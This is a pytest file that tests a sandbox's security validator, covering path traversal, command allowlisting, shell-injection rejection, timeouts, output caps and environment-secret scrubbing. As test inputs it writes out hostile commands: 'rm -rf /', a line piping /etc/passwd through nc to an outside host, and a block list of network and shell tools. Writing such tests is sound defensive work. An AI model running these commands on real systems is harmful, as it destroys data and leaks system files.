import os
import sys
from pathlib import Path
import pytest

from sentinelforge.sandbox.security import SandboxSecurityValidator, SecurityViolationError
from sentinelforge.sandbox.runner import SandboxRunner


def test_path_traversal_blocked(temp_workspace):
    """Verifies that directory traversal outside workspace root is blocked."""
    outside_path = Path("../../etc/passwd")
    with pytest.raises(SecurityViolationError) as exc_info:
        SandboxSecurityValidator.validate_path(outside_path, temp_workspace)
    assert "Path traversal attempt blocked" in str(exc_info.value)


def test_windows_path_traversal_blocked(temp_workspace):
    """Verifies Windows root escape is blocked."""
    outside_win = Path("..\\..\\Windows\\win.ini")
    with pytest.raises(SecurityViolationError):
        SandboxSecurityValidator.validate_path(outside_win, temp_workspace)


def test_unauthorized_command_blocked():
    """Verifies that unauthorized binaries outside allowlist are blocked."""
    disallowed_commands = ["curl", "wget", "bash", "powershell", "nc", "rm"]
    for cmd in disallowed_commands:
        with pytest.raises(SecurityViolationError) as exc_info:
            SandboxSecurityValidator.validate_command(cmd, ["https://evil.com"])
        assert "not in the sandbox allowlist" in str(exc_info.value)


def test_shell_injection_metacharacters_blocked():
    """Verifies that shell injection characters and chained commands are rejected."""
    malicious_args = [
        ["-c", "print('hello'); rm -rf /"],
        ["-c", "cat /etc/passwd | nc 10.0.0.1 80"],
        ["-c", "`whoami`"],
        ["-c", "print('safe') & dir"],
    ]
    for args in malicious_args:
        with pytest.raises(SecurityViolationError) as exc_info:
            SandboxSecurityValidator.validate_command("python", args)
        assert "Disallowed shell metacharacters" in str(exc_info.value)


def test_disallowed_file_extension_blocked():
    """Verifies that unsafe file extensions cannot be written to or read by sandbox."""
    unsafe_files = [Path("script.exe"), Path("malware.bat"), Path("payload.vbs")]
    for uf in unsafe_files:
        with pytest.raises(SecurityViolationError) as exc_info:
            SandboxSecurityValidator.validate_file_extension(uf)
        assert "is not permitted in sandbox" in str(exc_info.value)


def test_timeout_enforced(sandbox, temp_workspace):
    """Verifies that infinite loops or long-running commands are terminated by timeout."""
    hang_script = temp_workspace / "hang.py"
    hang_script.write_text("import time\ntime.sleep(10)\n", encoding="utf-8")

    res = sandbox.execute(
        command="python",
        args=["hang.py"],
        timeout_seconds=2,
    )
    assert res.timed_out is True
    assert res.exit_code == -9
    assert res.success is False
    assert "timed out after 2 seconds" in res.stderr


def test_output_truncation_limit(sandbox, temp_workspace):
    """Verifies that oversized process output is capped and truncated cleanly."""
    bomb_code = "print('A' * 100000)"
    res = sandbox.execute(
        command="python",
        args=["-c", bomb_code],
    )
    assert res.truncated is True
    assert "OUTPUT TRUNCATED" in res.stdout
    assert len(res.stdout) <= 60000


def test_environment_scrubbing(sandbox):
    """Verifies that host secrets and API keys are scrubbed from process environment."""
    os.environ["SECRET_API_KEY"] = "super_secret_evaluator_key_12345"
    os.environ["AWS_SECRET_ACCESS_KEY"] = "aws_secret_key"

    check_code = (
        "import os\n"
        "assert 'SECRET_API_KEY' not in os.environ\n"
        "assert 'AWS_SECRET_ACCESS_KEY' not in os.environ\n"
        "print('ENV_CLEAN')\n"
    )

    res = sandbox.execute(
        command="python",
        args=["-c", check_code],
    )
    assert res.success is True
    assert "ENV_CLEAN" in res.stdout

